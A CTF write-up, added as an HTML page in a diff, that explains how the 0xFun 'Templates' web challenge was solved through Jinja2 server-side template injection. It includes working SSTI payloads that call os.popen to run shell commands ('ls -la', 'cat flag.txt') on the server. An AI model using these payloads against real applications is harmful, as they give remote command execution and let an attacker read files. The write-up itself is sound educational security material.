@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>voidwr - OxFun - Templates</title>
+  <link rel="stylesheet" href="/staging/assets/css/writeups.css">
+</head>
+<body>
+
+<!-- NAVIGATION -->
+<nav class="navbar">
+  <ul class="nav-menu">
+    <li><a href="/index.html" class="nav-link">🏠 Home</a></li>
+    <li><a href="/writeups.html" class="nav-link">📝 Writeups</a></li>
+    <li><a href="/about.html" class="nav-link">❤️ About</a></li>
+  </ul>
+</nav>
+
+<!-- WRITEUP CONTENT -->
+<section class="writeup-hero">
+  <div class="writeup-hero-overlay"></div>
+  <div class="writeup-hero-content">
+    <h1>OxFun CTF 2026 - Templates</h1>
+  </div>
+</section>
+
+<section class="writeup-content">
+  <a href="0xfun.html" class="writeups-back-link">Back to 0xFun</a>
+  <a href="/writeups.html" class="writeups-back-link">Back to Writeups</a>
+  
+  <div class="writeup-body">
+    <h2>Overview</h2>
+    <div class="writeup-banner-full-width">
+      <img src="/staging/writeups/ctf/0xfun/media/Templates-web/prompt.png" alt="Prompt" class="writeup-banner-link" onclick="openImageModal(this)">
+    </div>
+    <p>
+      Templates was a web challenge that was meant to be solved with a 
+      Server Side Template Injection (SSTI) vulnerability.
+    </p>
+
+    <h2>Challenge</h2>
+    <p>
+      From the prompt we assume that this has to do with f<code>jinja2</code>, <code>django</code>
+      or similar template engines that are used in web development.
+    </p>
+    
+        <div class="code-block">
+      <div class="code-header">Prompt</div>
+      <pre>
+        <code>
+        Just a simple service made using Server Side Rendering.
+        </code>
+    </div>
+
+    <h2>Flag</h2>
+    <p>
+      When we land on the site we see a <i><strong>Greeting Service</strong></i>
+      that asks us to enter our name.
+    </p>
+
+    <div class="gallery-item">
+        <img src="/staging/writeups/ctf/0xfun/media/Templates-web/website.png" alt="Initial View" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 1: Initial view of the web app.</p>
+    </div>
+
+    <p>
+      First things first we need to see if we can break
+      anything by using special characters and the first thing was to try <code>{{7*7}}</code>
+    </p>
+
+    <p>
+      And notably we get the result of the operation which is <code>49</code> rendered on the page.
+    </p>
+
+    <div class="gallery-item">
+        <img src="/staging/writeups/ctf/0xfun/media/Templates-web/vuln_found.PNG" alt="SSTI Test" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 2.1: SSTI Test.</p>
+    </div>
+
+    <div class="gallery-item">
+        <img src="/staging/writeups/ctf/0xfun/media/Templates-web/vuln_found2.PNG" alt="SSTI Test" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 2.2: SSTI Test.</p>
+    </div>
+
+    <p>
+      From this we can confirm that the application is running flask and jinja2 templates
+      and is vulnerable to SSTI attacks. Now it's just a matter of finding a way to exploit this 
+      vulnerability to get the flag.
+    </p>
+
+    <p>
+        From researching we can find a <code>popen</code> method in python 
+        that allows us to execute commands on the server. So let's first run an
+        <code>ls -la</code> to see what we have in the current directory right now.
+    </p>
+
+    <pre>
+      <code>
+        {{ config.__class__.__init__.__globals__['os'].popen('<strong>ls -la</strong>').read() }}
+      </code>
+    </pre>
+
+    <p>
+      And we get a long string of the files in the working directory. 
+      If we beautify it to a notepad we can clearly see all the files.
+    </p>
+
+    <div class="gallery-item">
+        <img src="/staging/writeups/ctf/0xfun/media/Templates-web/ls_la.png" alt="LS Output" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Figure 3: LS Output.</p>
+    </div>
+
+    <pre>
+      <code>
+            total 16 
+            drwxr-xr-x 1 root root 4096 Oct 22 10:56 . 
+            drwxr-xr-x 1 root root 4096 Feb 12 22:02 .. 
+            -rw-r--r-- 1 root root 46 Sep 26 23:23 flag.txt 
+            -rw-r--r-- 1 root root 1448 Sep 26 23:23 main.py 
+      </code>
+    </pre>
+
+    <p>
+      We can also see the <code>flag.txt</code> so let's change the same command to 
+      a <code>cat flag.txt</code> and get the flag.
+    </p>
+
+    <pre>
+      <code>
+        {{ config.__class__.__init__.__globals__['os'].popen('<strong>cat flag.txt</strong>').read() }}
+      </code>
+    </pre>
+    <div class="gallery-item">
+        <img src="/staging/writeups/ctf/0xfun/media/Templates-web/flag.png" alt="Flag" class="gallery-image" onclick="openImageModal(this)">
+        <p class="image-caption">Flag: <strong>0xfun{Server_Side_Template_Injection_Awesome}</strong>.</p>
+    </div>
+    
+    <!-- ===== REFERENCES SECTION ===== -->
+    <h2>References</h2>
+    <div class="references-grid">
+      <a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" class="reference-card">
+        <div class="reference-icon"></div>
+        <h3>Server‑Side Template Injection (SSTI)</h3>
+        <p>
+          Server-side template injection | Web Security Academy. (n.d.). 
+          https://portswigger.net/web-security/server-side-template-injection
+        </p>
+        <span class="reference-link">portswigger.net</span>
+      </a>
+    </div>
+
+    <!-- ========== END TEMPLATE SECTIONS ========== -->
+  </div>
+  <a href="0xfun.html" class="writeups-back-link">Back to 0xFun</a>
+</section>
+ 
+
+<script src="/staging/assets/js/main.js"></script>
+<script src="/staging/assets/js/writeups.js"></script>
+</body>
+</html>
